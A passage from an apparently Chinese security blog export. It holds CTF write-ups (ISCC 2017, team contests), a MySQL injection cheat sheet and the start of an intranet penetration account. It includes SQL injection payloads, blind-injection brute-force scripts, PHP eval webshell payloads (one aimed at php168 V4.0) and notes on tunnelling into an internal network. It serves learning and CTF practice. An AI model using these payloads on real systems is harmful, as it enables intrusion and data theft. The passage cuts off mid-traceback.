trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if($username == 'admin')&#123; die(\"you can't login this as admin!\"); &#125; $sql = \"select * from `user` where username='\".mysql_escape_string($username).\"' and passwd='\".mysql_escape_string($passwd).\"'\"; $res = mysql_query($sql); if($res)&#123; exit($flag); &#125;else&#123; echo \"sorry,username or passwd error!\"; &#125; &#125; function source()&#123; highlight_file(__FILE__); &#125; $username = isset($_POST['username'])?filter($_POST['username']):\"\"; $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):\"\"; $action = isset($_GET['action'])?filter($_GET['action']):\"source\"; switch($action)&#123; case \"source\": source(); break ; case \"login\" : login($username,$passwd);break; case \"show\" : show($username);break; &#125; 利用show函数查询password的每一位。 Reverse多试几次惯例先反编译main()函数发现输出了一次flag{},感觉事情并没有那么简单，在最后发现了eee()函数。 a的字符串是SDUST,按照代码写脚本。12345a='SDUST'b=''for c in a: b=b+chr(ord(c)^32)print b flag:sdust","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"IsccCTF WriteUp","date":"2017-05-25T16:00:00.000Z","path":"2017/05/26/IsccCTF WriteUp/","text":"在表哥的推荐下尝试了一下Iscc CTF，记录一下自己的答题过程。 BasicWheel Cipher附件：Basic-01.zip1234567891011121314151617加密表：1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;密钥为：2，3，7，5，13,12,9，1，8，10，4，11，6密文为：NFQKSEVOQOFNP 根据题目找到资料：杰斐逊密码盘 处理加密表123456789101112132: &lt; NACZDTRXMJQOYHGVSFUWIKPBEL &lt;3: &lt; FHTEQGYXPLOCKBDMAIZVRNSJUW &lt;7: &lt; QGWTHSPYBXIZULVKMRAFDCEONJ &lt;5: &lt; KCPMNZQWXYIHFRLABEUOTSGJVD &lt;13: &lt; SXCDERFVBGTYHNUMKILOPJZQAW &lt;12: &lt; EIURYTASBKJDFHGLVNCMXZPQOW &lt;9: &lt; VUBMCQWAOIKZGJXPLTDSRFHENY &lt;1: &lt; OSFEZWAXJGDLUBVIQHKYPNTCRM &lt;8: &lt; QNOZUTWDCVRJLXKISEFAPMYGHB &lt;10: &lt; OWTGVRSCZQKELMXYIHPUDNAJFB &lt;4: &lt; FCUKTEBSXQYIZMJWAORPLNDVHG &lt;11: &lt; NBVCXZQWERTPOIUYALSKDJFHGM &lt;6: &lt; PNYCJBFZDRUSLOQXVETAMKGHIW &lt; 找有意义字符串 flag：FIREINTHEHOLE 你猜猜。。附件：Basic-04.zip 打开附件中的txt,出现了一堆16进制的数字，看到头开的504B，猜测是压缩包。 用winhex储存为压缩包，发现里面含有一个加密的flag.txt，用工具暴力破解，得到zip密码为123456，打开txt得到flag。flag：daczcasdqwdcsdzasd 公邮密码附件：Basic-08.zip 解压得到加密zip和一个名为pw WINDoWsSEViCEss，15位，大小写都有，猜测培根密码。解密得BIT，解压zip，得到txt内容为RmxhZzp7THkzMTkuaTVkMWYqaUN1bHQhfQ==，base64解密。flag：Flag:{Ly319.i5d1f*iCult!} 神秘图片附件：Basic-03.zip 得到一张png，放在binwalk中分析，发现还有一张png，提取出来 得到猪圈(共济会)密码的密文，按照百度百科解密即可 flag：goodluck 告诉你个秘密附件：Basic-02.zip 给出了含有16进制数字的txt，16进制转ascii 12cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g base64解码：12r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 键盘围起来的键：TONGYUANflag:TONGYUAN PHP_encrypt_1附件：Basic-09.zip 给出了密文fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=和php的加密代码123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; python解密脚本12345678910111213141516171819202122import base64import hashlibs='fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='s=base64.b64decode(s)key=hashlib.md5('ISCC').hexdigest()flag=''char=''x=0l=len(s)klen=len(key)for i in range(0,l): if(x==klen): x=0 char=char+key[x] x=x+1for i in range(0,l): if(ord(s[i])-ord(char[i])&lt;0): flag=flag+chr(ord(s[i])+128-ord(char[i])) else: flag=flag+chr(ord(s[i])-ord(char[i]))print flag 二维码附件：Basic-07.zip 一张二维码图片，先扫描得到The password of the router is our flag 直接改文件后缀名变成zip,解压，得到另一个加密的zip文件。 用zip爆破工具爆破，密码是20161114 解压，有一个cap文件和一个txt，txt内容为前四位是ISCC 后四位由大写字母和数字构成，用EWSA工具字典爆破。 python生成字典：123456789101112s= r'1234567890QWERTYUIOPASDFGHJKLZXCVBNM'ss='ISCC'f=open('dic.txt','w')for a in s: for b in s: for c in s: for d in s: ss=ss+a+b+c+d f.write(ss) f.write('\\n') ss='ISCC'f.close() 用ESWA工具爆破得到flag：ISCC168A MobileMisc眼见非实附件：Misc-02.zip 题目给出一个word文档，结果没办法用word打开，用ue查看，发现文件头是PK，直接解压。在文件夹中搜索flag关键字即可。 flag：flag{F1@g} 就在其中附件：Misc-03.zip 题目给的pcapng用wireshark分析，在tcp协议中看到了PK开头的16进制，提取保存zip发现有key.txt,却提取失败。用binwalk直接提取全部，去掉看起来无用的部分，剩下了一个zip，zip中提取的key.txt，一个.key文件，key文件中存在rsa私钥。 利用openssl进行RSA加密解密 运用openssl解密openssl rsautl -decrypt -inkey AC76.key -in key.txt -out 1.txt 打开生成的1.txt。 flag：haPPy_Use_0penSsI 很普通的Disco附件：Misc-04.zip 一道mp3隐写题，用GoldWave打开，分析波形，转到最前面发现有一部分奇怪的波形。将单声道波形提取出来，接近1的变成1，接近-1的变成0，得到二进制 11001101101100110000111001111111011101011101100001010111010101011001101110101110111011011101111001111110 二进制转ascii码 flag:flag{W0W*funny} 很普通的数独附件：Misc-05.zip 解压出25个数独的图片，但是并不用做数独，将有数字的部分填充为黑色，没有数字保持白色，25个图，5*5构成一个二维码。扫描得base64Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9 多次base64解码。 flag：flag{y0ud1any1s1} WebWeb签到题，来和我换flag啊！如题目所说，web的签到题，脑洞题。 查看源代码123456&lt;form name=\"flag\" action=\"index.php\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"hiddenflag\" value=\"\"&gt; &lt;input type=\"text\" name=\"flag\" value=\"Let's change flag\"&gt; &lt;/br&gt; &lt;input type=\"submit\" value=\"换FLAG!\"&gt;&lt;/form&gt; 有一个隐藏的hiddenflag变量，直接在文本框输入f1ag，返回哼,就给我一个flag我才不和你换呢，看来hiddenflag也需要赋值，返回还不够诚意,不和你换FLAG，这里出了一个大写的FLAG，猜测这个也需要赋值，构造post参数hiddenflag=f1ag&amp;flag=f1ag&amp;FLAG=f1ag，返回这样才有诚意,flag给你吧!，但是页面并没有显示什么，burpsuite抓包，发现在http响应头中有了f1ag: {N0w_go1Odo!otherw3b} WelcomeToMySQL打开链接是一个文件上传的php，随便上传了一张图片，返回了上传路径upload/xxxx,并有一个提示hint:$servername,$username,$password,$db,$tb is set in ../base.php,那就试试上传shell吧，只要上传.php就会有js弹窗，%00等等绕过也没办法。 经表哥指点，有一种 php5 的神奇的php文件格式，上传通过，用C刀链接。找到base.php。1234567&lt;?php $servername=\"localhost\"; $username=\"iscc2017\"; $password=\"iscc2017\"; $db=\"flag\"; $tb=\"flag\";?&gt; 存放的应该是mysql的登录信息了，用C刀自带的数据库管理功能登陆，在数据库中找到flag。Flag:{Iscc_1s_Fun_4nd_php_iS_Easy} where is your flag用burpsuite抓包，发现网站的编码是gbk，显示******flag is in flag，访问flag.php，hint:thisisflag。 网站的编码是gbk，猜测是宽字节注入。 在网站加上?id=2，字符串******flag is in flag消失了，确定了是sql注入。 报错：?id=1%df%27 查询列数：12?id=1%df%27 order by 1,2 --+ 正确?id=1%df%27 order by 1,2,3 --+ 报错 查询数据库名：?id=1%df%27 union select 1,group_concat(schema_name) FROM information_schema.schemata --+ information_schema,web_robots 查询表名：?id=1%df%27 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+ article,flag 查询列名：?id=1%df%27 union select 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() --+ id,content,id,thisisflag 出现了thisisflag，跟flag.php提示我们的一样，我们就去查这个字段。 查询字段：?id=1%df%27 union select 1,concat(thisisflag) FROM flag--+，返回Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,IMPLICIT) for operation &#39;UNION&#39;，用union函数查询的时候，表的编码与网页的编码不同，无法输出。 利用hex()函数将输出的内容转化为16进制，再转化回来。payload：?id=1%bf%27 union select 1,hex(concat(thisisflag)) From flag --+得到16进制666C61673A7B34343162376661313631373330376265393633323236336134343937383731657Dflag：flag:{441b7fa1617307be9632263a4497871e} 我们一起来日站打开题目，提示我们寻找网站后台。试过了一些简单的/admin/之类的都是404，经表哥提示，找到了robots.txt，访问得到123456## robots.txt #User-agent: * Disallow: /21232f297a57a5a743894a0e4a801fc3/Disallow: /api 进入http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/，提示寻找继续寻找admin page，这里直接admin.php就找到了后台。用burpsuite抓包，发现存在sql漏洞运用万能密码&#39;or &#39;a&#39;=&#39;a (常用万能密码)Flag:{ar32wefafafqw325t4rqfcafas} 自相矛盾php代码审计题，先看源代码,因为运行的代码只输出nope，看不出执行到了那一步，所以我改了一下在本地测试。 代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$flag=\"flag!!!!!!\";$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['iscc']); #get方法读入iscc，json化。if(is_array($a))&#123; is_numeric(@$a[\"bar1\"])?die(\"nope1\"):NULL; if(@$a[\"bar1\"])&#123; ($a[\"bar1\"]&gt;2016)?$v1=1:NULL; &#125; #iscc中bar1对应的值不能为数字却要大于2016 if(is_array(@$a[\"bar2\"]))&#123; if(count($a[\"bar2\"])!==5 OR !is_array($a[\"bar2\"][0])) die(\"nope2\"); #bar2对应的值必须是5个元素的数组且bar2数组的0位必须也是数组。 $pos = array_search(\"nudt\", $a[\"bar2\"]); $pos===false?die(\"nope3\"):NULL; foreach($a[\"bar2\"] as $key=&gt;$val)&#123; $val===\"nudt\"?die(\"nope4\"):NULL; &#125; #取数组的每一位与nudt比较，既要含有，又不能含有。 $v2=1; &#125; &#125;#echo $v1,\" \",$v2;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; #echo \"1234\"; eregi(\"3|1|c\",$d.$c[0])?die(\"nope5\"):NULL; strpos(($c[0].$d), \"isccctf2017\")?$v3=1:NULL; &#125; &#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; echo $flag;&#125;?&gt; 主要知识是php的弱类型：当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 bar1可以传入字符串格式，比较会强制转换。 {&quot;bar1&quot;:&quot;2017a&quot;} bar2传入5位数组且0位也要是数组， array_search() 函数比较也是弱类型比较，intval(“nudt”)=0。 {&quot;bar2&quot;:[[0],0,0,0,0]} cat也是数组，不过cat[1]要与dog比较，dog需要含有isccctf2017，eregi()可以用%00截断。 cat[0]=1&amp;cat[1][]=1&amp;dog=%00isccctf2017 payload:?iscc={&quot;bar1&quot;:&quot;2019a&quot;,&quot;bar2&quot;:[[0],0,0,0,0]}&amp;cat[0]=1&amp;cat[1][]=1&amp;dog=%00isccctf2017 得到flag：flag{sfklljljdstuaft} Reverse你猜附件：Reverse02.zip 用ida打开，直接找到main，反编译。题目让找到三个string。 如果要输出good job，就要让sub_400646()返回0，sub_400755()返回1。进入这两个函数。 sub_400646()函数比较了输入字符串，一排vx就是用于比较的标准字符串，得到两个字符串l1nux、crack。 sub_400755()函数更简单，按照if语句条件可依次推出字符串，ILCF! flag：flag{l1nux_crack_ILCF!} 文章： 1.http://www.tuicool.com/articles/2E3INnm","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"SQL注入姿势","date":"2017-04-29T16:00:00.000Z","path":"2017/04/30/SQL注入姿势/","text":"什么是SQL注入攻击者将sql查询语句通过参数过滤不当的部分传入服务器中，数据库执行攻击者插入的sql查询语句，让攻击者得到自己想要的数据或者达成想达到的目的。 判断是否存在SQL注入 12345&apos;and 1=1and 1=2and sleep(5)…… SQL语句可插入位置url，常在?id=xxx后，通过get方法。 post，利用post方法。 http header，通过修改http header某些数值来插入sql语句。 SQL注入分类在《web安全深度剖析》中，作者分为两类：数字型注入和字符型注入。 数字型注入如果参数是id，年龄，页码等，那么极大可能是数字型的注入。 例如：url为http://www.xxxx.com/index.php?id=1 那么sql查询语句很有可能为select * from table where id=1 可以用&#39;(页面出错)、and 1=1(正常显示)、and 1=2(不出错，但显示不正常)等看是否存在sql注入漏洞。 字符型注入和数字型注入最大的区别在于，字符型注入需要用&#39;闭合字符串。 参数可能是用户名等。 例子：http://www.xxxx.com/index.php?username=&#39;admin&#39; 查询语句可能为：select * from table where username=&#39;admin&#39; 但是如果直接插入sql语句并不能执行，因为查询语句中还有一个&#39; 所以运用sql语句的注释功能将后面的&#39;注释掉。 例子：?username=admin&#39; and 1=1 -- sql查询语句为：select * from table where username=&#39;admin&#39; and 1=1--&#39; 各种sql注入利用姿势及备忘Mysql常用语句mysql自带函数：user()、version()、database() 获取所有数据库：?id=-1&#39; union select 1,group_concat(schema_name),3 FROM information_schema.schemata --+ 获取所有表名：?id=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+ 获取所有列名：?id=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=&#39;users&#39; --+ 获取字段：?id=-1&#39; union select 1,2,group_concat(id,0x7e,username,0x7e,password) FROM users --+ (0x7e是~的ascii码值) 读取文件：select load_file(&#39;/etc/passwd&#39;) 写文件：select &#39;&lt;?php phpinfo(); ?&gt;&#39; INTO OUTFILE &#39;/var/www/html/info.php&#39; union查询(联合查询注入)利用union select依次查询列数、数据库名、表名、列名、字段名…… 同样，利用&#39;、and 1=1、and 1=2判断是否存在注入。 查询列数：?id=1&#39; ORDER BY 1,2,3 --+ 返回正常 ?id=1&#39; ORDER BY 1,2,3,4 --+ 报错：Unknown column &#39;4&#39; in &#39;order clause&#39;说明只有3列。 bool型盲注运用布尔型的函数和对应的显示界面，来判断自己查询的部分是否正确。 可利用的函数有length()、ascii()、mid()等等 构造注入12true&apos; and bool#&apos; or bool# 构造bool值12345length(user())=&apos;8&apos;left(user(),1)&lt;&apos;r&apos;right(user(),1)&gt;&apos;t&apos;substr(user(),1,1)=&apos;r&apos;mid(user(),1,1)=&apos;r&apos; 注：用binary()函数使大小写敏感 延时型盲注与bool盲注类似，在不直接返回bool值的情况下注入，利用sleep()。 例如：if((bool),sleep(2),0) 报错注入mysql报错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 floor?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) ExtractValue(有长度限制,最长32位)?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) UpdateXml(有长度限制,最长32位)?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) NAME_CONST(适用于低版本，不太好用)?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)id=1 and (select exp(~(select * from(select user())x)))","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"sqli","slug":"sqli","permalink":"http://yoursite.com/tags/sqli/"}]},{"title":"4.16日小组赛WriteUp","date":"2017-04-22T16:00:00.000Z","path":"2017/04/23/4.16日小组赛WriteUp/","text":"Web土豪才能用的机器打开页面，显示：I have a Mac,I am a coder,I love programing!!! 我的以为是修改http header来解，以各种姿势修改，都没有得到flag。 正确思路是Mac写代码会产生.DS_Store的隐藏文件，下载下来就是flag。 必须是数字查看源代码，发现了I love vim，想起之前做的题有vim产生.swp的隐藏文件。 于是访问.index.php.swp，得到index.php的源代码。发现还有一个f149.php，抓包，是一个php代码审计。只能输入数字，而且还要有flag，想起php中==是松散比较，直接构造payload尝试。得到flag。 输入密码查看源码:1234567if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) die( 'Flag: '.$flag); else print 'you are close'; &#125; 这地方有个坑，php代码中是a变量，但是页面中提示check please input the password。 所以要用password变量，松散比较直接用数组。 请努力微笑参考Wp：http://blog.csdn.net/gwenchill/article/details/46679621 信息收录代码审计：123456789101112131415161718192021function new_addslashes($string)&#123; if(!is_array($string)) return addslashes($string); foreach($string as $key =&gt; $val) $string[$key] = new_addslashes($val); return $string; &#125;$_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE);$data = isset($_POST['data']) ? $_POST['data'] : ''; $user_config = \"&lt;\\?php \\n\"; foreach($data as $key =&gt; $value)&#123; $key = strtoupper($key); $user_config .= \"define($key, '$value');\\n\"; &#125;@file_put_contents('user_config.php', $user_config); Post的参数以数组的形式传递，经过过滤后保存到user_config.php中。 但是他过滤了数组的value值，没有过滤key值，可以在post的数组的key值上写入一句话。 payload：data[&#39;name&#39;,&#39;1&#39;);eval($_POST[&#39;C&#39;]) 菜刀链接即可得到flag。 泄露了什么东西访问index.zip下载源码。代码审计12345678910111213141516&lt;?php extract($_GET); include('flag.php'); if (!empty($dpc)) &#123; $combination = trim(file_get_contents($filename)); if ( $dpc === $combination) &#123; echo \"&lt;p&gt;Hello:\" .\" $combination!?&lt;/p&gt;\"; echo \"&lt;p&gt;Congratulation!!! flag is:\" .\" $flag&lt;/p&gt;\"; &#125; else &#123; echo \"&lt;p&gt;sorry!&lt;/p&gt;\"; &#125; &#125; ?&gt; 变量覆盖，却没有结果。 看了writeup居然是变量sdust ORZ payload：/index.php?filename=php://input&amp;sdust=1 post: 1 php regrex查看源码，发现需要用的正则表达式。 正则表达式我不太了解，只能请教。 http://www.runoob.com/regexp/regexp-tutorial.html 了解的并不深入，还需要进一步学习。 Misc八十年代的歌下载了个一docx文件，打开并没有发现什么。docx文件可以直接改zip打开。找到flag.xml得到flag。 来夺旗啊因为有加密后zip的一部分key.txt可以使用明文攻击。 pkcrack –c key.txt –p key.txt –C misc50.zip –P key.zip -d de.zip 神秘的密码经过提示是IDA块的数据，然后用hex解码，转成RGB12345678import zlibimport binasciiIDAT=\"789c9d940b0e80300843af04f1fe7733313196f6cd5fc874930e3ae8dc6afb673dac8e717acea7631475216abc13a3b12eafee6bc4f017cffbb44bd93b738fac5ee7cfe7ca1ae6f01adef7a41628cd32f934fa1a7666169d3943d247430caf8acf9517afbd7e8a59ad93a9abd63badb3b779e85c69a49d8ce7f57cab8954a2736436f3acb312d4ad44937ee8eeccbb9c78ba9515fe953af91fa11ee7c1fd48544734d73b292cb37cb21d0a2d1b33\".decode('hex')result=binascii.hexlify(zlib.decompress(IDAT))print(result) 12345678910111213141516#!/usr/bin/env pythonimport ImageMAX = 27pic = Image.new(\"RGB\",(MAX, MAX))str = \"000000000000000000000000000011111110100001001011111110010000010110011001010000010010111010001001101010111010010111010010010110010111010010111010111100000010111010010000010100010010010000010011111110101010101011111110000000000000001101000000000011110110010001111101100110000111100001101001010011110000011111101001000110100000001000001000010110000101100001111010100101101001011010011000001110010111100101110011100010010110100101101000001000001111111111000001010010010110111111101111100000000000000010001001000110100011111110000110001010111000010000010100010101000111100010111010011001101111100010010111010100001001000011010010111010101110011101100110010000010100110011001011110011111110100000011100110010000000000000000000000000000\"i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1 pic.show()pic.save(\"flag.png\") 得到二维码，扫码得flag。 总结 php数组是个重要的东西，可以绕过很多松散比较。 php自动回替.为_。 docx可以直接改为zip打开。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"4.22日小组赛WriteUp","date":"2017-04-22T16:00:00.000Z","path":"2017/04/23/4.22小组赛WripteUp/","text":"Miscsimple~MVWDAYLEMMZTSNBZMJQTKOLBMJRGKNJWMUYDKN3GGIYGMOBYGNSQ 因为是大写字母+数字，猜测是base32，解密得 el0adc3949ba59abbe56e057f20f883e有32个字符，猜测是MD5，但是解不出来，题目中说仔细点就好了，突然发现字符串中有一个l 把l替换为1。e10adc3949ba59abbe56e057f20f883e 解密得：123456 Decipher ciphertext下载123.pcapng，用wireshark打开，找到了一个可以的http头123456789101112131415161718POST /index.php HTTP/1.1Host: 192.168.146.129User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: E=17;P=473398607161;Q=4511491;Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 20C=914974633918197511HTTP/1.1 404 Not FoundDate: Tue, 18 Apr 2017 09:18:04 GMTServer: Apache/2.4.10 (Win32) OpenSSL/0.9.8zb PHP/5.3.29Content-Length: 207Connection: closeContent-Type: text/html; charset=iso-8859-1 根据rsa的提示，用工具解密 Not only a picture用binwalk分析没有什么东西，可能是lsb隐写。 http://www.tuicool.com/articles/qINzyum 用Stegsolve将最低位的数据提取出来。 得到一个带密码的zip，用ue打开，发现有很多空格带了一个careful。 后来发现是zip里的注释，猜测careful就是zip的密码，解码得到flag Prime没得说，直接脚本求解：1234567891011121314151617181920212223242526272829303132333435#include &lt;bits\\stdc++.h&gt;using namespace std;bool isPrime(int n)&#123; if(n&lt;=1) return false; for (int i=2;i&lt;sqrt(n)+1;i++) if(n%i==0) return false; return true;&#125;int main()&#123; int n[1111]; int i,k=1; for(i=123456789;i&lt;=987654321;i++) &#123; int a=i,num=0; while(a!=0) &#123; num+=a%10; a/=10; &#125; //cout&lt;&lt;num&lt;&lt;endl; if(isPrime(i)&amp;&amp;isPrime(num)) &#123; k++; n[k]=i; //cout&lt;&lt;k&lt;&lt;endl&lt;&lt;n[k]&lt;&lt;endl; &#125; if(k&gt;800) break; &#125; int ans=n[123]+n[456]+n[789]; cout&lt;&lt;ans&lt;&lt;endl;&#125; WebSimple代码审计：12345678910111213141516if (isset($_GET['username']) &amp;&amp; isset($_GET['password']))&#123; $conn = mysql_connect(\"localhost\", \"?????\", \"??????\") or die(\"error\".mysql.error()); mysql_select_db(\"????\", $conn) or die(\"access error！\".mysql.error()); $username = addslashes($_GET['username']); $sql = \"SELECT `password` FROM `user` WHERE `username`='&#123;$username&#125;'\"; $res = mysql_query($sql, $conn); if ($res['password'] === md5($_GET['password'])) &#123; //...login success &#125; else &#123; echo \"login failed!\"; &#125; &#125; 再次证明数组是个好东西。payload：/?username[]=admin&amp;password[]=admin&amp;submit=Submitnext.php12345678910111213if (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key =\"*********\"; if ($message-&gt;key == $key) &#123; echo \"flag\"; &#125; else &#123; echo \"fail\"; &#125; &#125; else&#123; echo \"~~~~\"; &#125; 将参数json编码，但是还是存在弱类型。payload：post： message={&quot;key&quot;:true} Login运用fuzz测试注入过滤：http://www.freebuf.com/sectool/76861.htmlbool型盲注:https://zhuanlan.zhihu.com/p/24756501 bool型盲注，我理解为运用布尔型的函数和对应的显示界面，来判断自己查询的部分是否正确。 mid函数是sql中用于从文本字段中提取字符串，题目中空格可以用()来绕过。 如，查询admin的passowrd的第一位值，随便输入一个 会提示用户名不存在，这时我们知道，我们猜测的位是不对的，也就是说，l并不是password的第一位。 当输入到d时，发现返回界面变成了密码错误，这说明d这个字符是password的第一位。 所以可以用python脚本来查询整个password的每一位。12345678910111213141516import requests #url = 'http://192.168.211.148:49167/index.php' url = 'http://192.168.139.241:10086/' def check(payload): postdata = &#123;'username':payload,'password':'xx'&#125; r = requests.post(url, postdata).content return 'password' in rpassword = '' s = '0123456789abcdef'for i in range(1,33): for c in s: payload = \"\\'or(mid((select(password)from(admin)),\"+str(i)+\",1)=\\'\"+c+\"\\')#\" if check(payload): password += c break print password Be admin查看源码1234567891011121314define(\"SECRET_KEY\", \"???\");define(\"IV\", \"???\");define(\"METHOD\", \"aes-128-cbc\");$v = '1234567890abcdef;admin=0';$enc = bin2hex(openssl_encrypt($v, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, IV));setcookie('user',$enc);$b = isset($_COOKIE['user'])?$_COOKIE['user']:$enc;$user = openssl_decrypt(hex2bin($b), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, IV);$admin = substr($user,-1);if($admin == 1)&#123; include 'flag.php'; echo $flag;&#125; 参考资料：http://wooyun.tangscan.cn/static/drops/tips-7828.html提示为CBC反转攻击，我理解为，将明文按16字节分段，修改第一组对应位置的内容，让下一组的对应位置发生变化。通过抓包发现了加密后的enc脚本：1234567891011import requestsenc = '13d7e9de1084cba540c14b500f86d80d1d17d34544d48c46a41d2e09bb5b1bc3'.decode('hex')enc = enc[:7]+chr(ord(enc[7]) ^ ord('0') ^ ord('1'))+enc[8:]enc = enc.encode('hex')print(enc)r = requests.get('http://192.168.139.241:10087/', cookies = &#123;'user':enc&#125;)print(r.content)#1234567890abcdef#;admin=0 得到flag。 ReverseSimple将文件拖入ida，找到了一些关键字符串，反编译main函数，发现存在check函数。 进入check函数，分析算法。 字符串进入check函数中，先进行了字母大小写的转换，大写变小写，小写变大写。 接着进入swap函数，相当于将字符串进行了反转。 最后return中，判断出了字符串的长度，运算后的字符串。 得到flag：HAPPY2017 王者荣耀先打开apk，文本框随便输入，点击，发现不能一起开黑啥的。 反编译apk，直接进入MainActivity。 发现点击按钮后进入了check函数，但是并没有在反编译的smail中。 找到lib中的so文件，放入ida中反编译，代码却没有看懂orz。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"记一次内网渗透","date":"2017-04-13T16:00:00.000Z","path":"2017/04/14/记一次内网渗透/","text":"0x01这次是2组表哥们搭建的靶机，提示还有一个内网靶机。 0x02 信息收集可以在网页的最底下看到相应的信息一个2007年的网站，应该会有很多漏洞，百度了一下php168V4.0 果然存在漏洞：利用login.php文件，将一句话木马windy.php缓存到cache目录下。 payload：login.php?makehtml=1&amp;chdb[htmlname]=wind.php&amp;chdb[path]=cache&amp;content=&lt;?php%20@eval($_POST[admin]);?&gt; 0x02 漏洞利用&amp;&amp;提权执行后再去访问相应的php,没有404，说明我们构造的windy.php已经写入了。既然已经有了一句话木马，我们就可以直接用菜刀链接到我们上传的php和以前一样，并没有添加用户权限，后来表哥提供给我了一个win7提权的exp。 将对应版本的exe传入到靶机目录，按照格式执行命令即可。效果拔群！ 内网代理之后我们来看看内网的靶机。 我们需要通过我们刚刚拿下的靶机来进入内网，采用内网代理的方法。 查阅信息，得知了sock5代理（regeorg+proxifier）进入内网的方法。 regeorg可以直接从github获取，proxifier也有各种破解版。 regeorg建立本地到靶机端的链接，通过proxifier设置各种应用的代理。 先配置regeorg： 1.先将regeorg包下自带的tunnel.xxx传入靶机(这里是php运行的，所以我上传的是php)。 如果你访问你上传的网页，显示如下图，说明你可以进入下一步了2.运行regeorg脚本，-p 为监听端口 -u 对应的tunne.xxx的地址 需要注意的是-u 对应的url一定要加入相应的协议头，否则就会报错。（当时在这一步卡了好久，甚至重装了好几次python） 报错信息：123456789101112131415Traceback (most recent call last): File &quot;reGeorgSocksProxy.py&quot;, line 412, in &lt;module&gt; if not 